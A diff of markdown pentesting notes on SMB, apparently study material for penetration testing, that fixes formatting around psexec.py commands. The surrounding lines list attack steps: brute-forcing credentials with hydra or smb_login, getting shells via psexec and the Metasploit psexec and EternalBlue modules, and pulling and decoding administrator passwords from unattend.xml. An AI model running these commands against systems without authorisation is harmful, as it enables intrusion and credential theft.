@@ -707,8 +707,8 @@ SMB have 2 layers of authentication:
 **Exploitation** of SMB:
 
 - credentials gathering: **`smb_login`** in Metasploit or `hydra`
-- using PsExec: [`psexec.py`]- pyhton implementation of PsExec
-    - [`psexec.py] username@<ip>` - then we enter the **password** like in SSH, we get a command session
+- using PsExec: `psexec.py`- pyhton implementation of PsExec
+    - `psexec.py username@<ip>` - then we enter the **password** like in SSH, we get a command session
 - using PsExec in **Metasploit**: `smb/psexec` exploit module
 
 ### EternalBlue (MS17-010/CVE-2017-0144)
@@ -963,7 +963,7 @@ Commands on **Linux**:
 
 1. `meterpreter > download C:\Windows\Panther\unattend.xml`
 2. `echo ‘<password>’ | base64 -d`
-3. [`psexec.py] administrator@<ip>`, then the password from unattend.xml
+3. `psexec.py administrator@<ip>`, then the password from unattend.xml
 
 **Powershell**:
 
@@ -2076,7 +2076,7 @@ Defacing the website: (changing)
 - `smbmap -H <ip> -u administrator -p <password>` - listing shares
 - `enum4linux -a -u administrator -p <password> <ip>` - listing all (`-a`)
 - `msf6 > use smb_enumusers`
-- `python3 [psexec.py] administrator@<ip>` or `msf6 > use smb/psexec` - gives cmd.exe
+- `python3 psexec.py administrator@<ip>` or `msf6 > use smb/psexec` - gives cmd.exe
 - `msf6 > use ms17_010_eternalblue`
 
 **MySQL**:
